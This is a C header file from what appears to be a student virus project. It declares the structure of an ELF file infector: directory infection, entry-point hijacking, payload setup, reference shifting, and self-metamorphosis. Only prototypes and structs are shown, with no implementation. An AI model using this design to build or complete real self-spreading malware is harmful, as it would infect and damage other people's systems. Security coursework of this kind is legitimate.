/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   virus.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/22 23:20:06 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef INFECT_H
# define INFECT_H // TODO

# include <fcntl.h>
# include <stdint.h>
# include <unistd.h>
# include <sys/types.h>
# include "famine.h"
# include "accessors.h"

/*
** hardcoded signature for
** "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
*/

# define SIGNATURE_LEN		64
# define SIGNATURE_CKSUM	0x1526

/*
** entry point related informations
*/

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

/*
** virus entry point and start routines
*/

void		virus(uint64_t seed[2]);
void		infect_files_in(const char *path, uint64_t seed[2]);
bool		infect_if_candidate(const char *file, uint64_t seed[2]);
bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, uint64_t seed[2]);

/*
** infection engine routines
*/

bool		find_entry(struct entry *original_entry, struct safe_ptr ref);
bool		can_infect(const struct entry *original_entry, struct safe_ptr ref);
bool		setup_payload(const struct entry *original_entry, struct safe_ptr ref, uint64_t son_seed[2]);
bool		adjust_references(struct safe_ptr ref, size_t shift_amount, const struct entry *original_entry);
bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size);
bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2], uint64_t client_id);

/*
** elf iterators
*/

typedef	bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);

bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);

/*
** end of virus (cf Makefile)
*/

void		_start(void);

#endif